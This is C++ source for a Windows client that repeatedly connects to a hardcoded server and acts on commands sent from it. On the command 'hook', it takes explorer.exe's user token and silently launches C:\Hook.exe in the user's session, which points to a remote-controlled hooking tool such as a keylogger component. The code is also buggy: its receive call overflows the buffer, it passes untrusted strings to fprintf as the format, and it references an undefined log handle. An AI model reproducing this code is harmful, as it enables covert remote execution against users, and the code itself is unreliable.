#include "cSocket.h"

SOCKET clientSocket;

HANDLE Thread[2];

CRITICAL_SECTION gcs;
bool SERVER_ONLINE = true;
bool THREAD_ALIVE = true;

string server_ip = "10.9.172.108";
const int port = 5438;	
bool CONNECTED_FLAG = false;

bool writeFile( FILE *fp, char str[] );
void ConnectServer();




DWORD WINAPI RecvThread(LPVOID lp)
{
	int num=*(DWORD*)lp;
	
	char receiveBuf[100];
	while(1)
	{
		int i = recv(clientSocket,receiveBuf,101,0);
		
        if( i == SOCKET_ERROR )
        {
            DWORD dwExitCode = 0; 
            SERVER_ONLINE = false;
            writeFile( log, "server is not online!\nkilling thread!\n");
            TerminateThread( Thread[1], dwExitCode );
            if( dwExitCode != STILL_ACTIVE )
            {
                writeFile( log, "thread killed successful!\n");
                break;
            }
        }
        else
        {
            SERVER_ONLINE = true;
        }
		
		
		if( SERVER_ONLINE==true && i>0 )
		{
            char recv_str[100] = "";
            sprintf( recv_str, "server:\n  %s\n", receiveBuf);
			writeFile( log, recv_str);

            judgeCommand( receiveBuf );
		}
	}
	return 0;
}


DWORD WINAPI SendThread(LPVOID lp)
{
	int num=*(DWORD*)lp;
    string input;
	while(1)
	{
        if( SERVER_ONLINE == false )
            break;
        else
            Sleep(2000);
        //cin>>input;
        //send(clientSocket,input.c_str(),input.length()+1,0);
	}
	
	return 0;
}



void ConnectServer()
{
    writeFile( log, "connecting successful!\n");
    SERVER_ONLINE = true;
    CONNECTED_FLAG = true;
	
	
	InitializeCriticalSection(&gcs);
	
	int num = 0;
	Thread[0] = CreateThread( NULL, 0, RecvThread, &num, 0,NULL); 
	Sleep(500);
	
	num = 1;
	Thread[1] = CreateThread( NULL, 0, SendThread, &num, 0,NULL); 
	Sleep(500);
	
	
    THREAD_ALIVE = true;
	
	
	WaitForMultipleObjects( 2, Thread, TRUE, INFINITE);
    writeFile( log, "stop connecting!\n");

	DeleteCriticalSection(&gcs);
	CloseHandle(Thread);
	
	
	CONNECTED_FLAG = false;
    writeFile( log, "stop successful!\n");
	
	return ;
}



//---create socket thread
DWORD WINAPI createSocketThread(LPVOID lp)
{
    int err;
	WORD versionRequired;
	WSADATA wsaData;
	versionRequired = MAKEWORD(1,1);
	err = WSAStartup(versionRequired, &wsaData);//协议库的版本信息
	if (err)
	{
		writeFile( log, "Client socket open fail!\n");
		return 1;//结束
	}
	else
	{
		writeFile( log, "Client socket open successful!\n");
	}
	
	
	int flag = -1;
	while(1) 
	{
		if ( CONNECTED_FLAG == false )
		{
            clientSocket = socket( AF_INET, SOCK_STREAM, 0 );
			SOCKADDR_IN clientsock_in;
			clientsock_in.sin_addr.S_un.S_addr = inet_addr( server_ip.c_str() );
			clientsock_in.sin_family = AF_INET;
			clientsock_in.sin_port = htons( port );
			
			flag = connect( clientSocket, (SOCKADDR*)&clientsock_in, sizeof(SOCKADDR) );
		}
		else
			Sleep(1000);
		
		if( flag != -1 && CONNECTED_FLAG == false )
		{
			ConnectServer();
		}
	}
	
	
	closesocket(clientSocket);//关闭
	WSACleanup();
	
	return 0;
	
}
//end create socket thread 



bool writeFile( FILE *fp, char str[] )
{
    time_t rawtime;
    struct tm * timeinfo;
	
    time ( &rawtime );
    timeinfo = localtime ( &rawtime );
    fprintf ( fp, asctime (timeinfo) );
	
    fprintf( fp, str );
    fprintf( fp, "\n" );
	
    return true;
}




//----run process 
BOOL GetTokenByName(HANDLE &hToken,LPSTR lpName)
{
	if(!lpName)
	{
		return FALSE;
	}
	HANDLE         hProcessSnap = NULL; 
	BOOL           bRet      = FALSE; 
	PROCESSENTRY32 pe32      = {0}; 
	
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 
	if (hProcessSnap == INVALID_HANDLE_VALUE) 
		return (FALSE); 
	
	pe32.dwSize = sizeof(PROCESSENTRY32); 
	
	if (Process32First(hProcessSnap, &pe32)) 
	{  
		do 
		{
			if(!strcmp(_strupr(pe32.szExeFile),_strupr(lpName)))
			{
				HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION,
					FALSE,pe32.th32ProcessID);
				bRet = OpenProcessToken(hProcess,TOKEN_ALL_ACCESS,&hToken);
				CloseHandle (hProcessSnap); 
				return (bRet);
			}
		} 
		while (Process32Next(hProcessSnap, &pe32)); 
		bRet = TRUE; 
	} 
	else 
		bRet = FALSE;
	
	CloseHandle (hProcessSnap); 
	return (bRet);
}

BOOL RunProcess(LPCSTR lpImage)
{
	if(!lpImage)
	{
		return FALSE;
	}
	HANDLE hToken;
	if(!GetTokenByName(hToken,"EXPLORER.EXE"))
	{
		return FALSE;
	}
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	
	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb= sizeof(STARTUPINFO);
	si.lpDesktop = TEXT("winsta0\\default");
	
	BOOL bResult = CreateProcessAsUser(hToken,lpImage,NULL,NULL,NULL,
		FALSE,NORMAL_PRIORITY_CLASS,NULL,NULL,&si,&pi);
	CloseHandle(hToken);
	if(bResult)
	{
		OutputDebugString("CreateProcessAsUser ok!\r\n");
	}
	else
	{
		OutputDebugString("CreateProcessAsUser false!\r\n");
	}
	return bResult;
}
//end run process


void openHook()
{
	HANDLE m_hMutex;
	m_hMutex = ::CreateMutex(NULL, TRUE, "Hook");
    if( GetLastError() == ERROR_ALREADY_EXISTS)		//程序已经运行
    {
		writeFile(log,"Hook.exe exists.\n");	
		CloseHandle(m_hMutex);
		return ;
	}
	else
	{
		writeFile(log,"Trying to run Hook.exe...\n");	
		RunProcess("C:\\Hook.exe");
		writeFile(log,"Running cyh.exe successful!\n");	
	}
}


bool judgeCommand( char *cmd )
{
    if( strcmp(cmd, "hook") == 0 ){
        openHook();
    }

    return true;
}
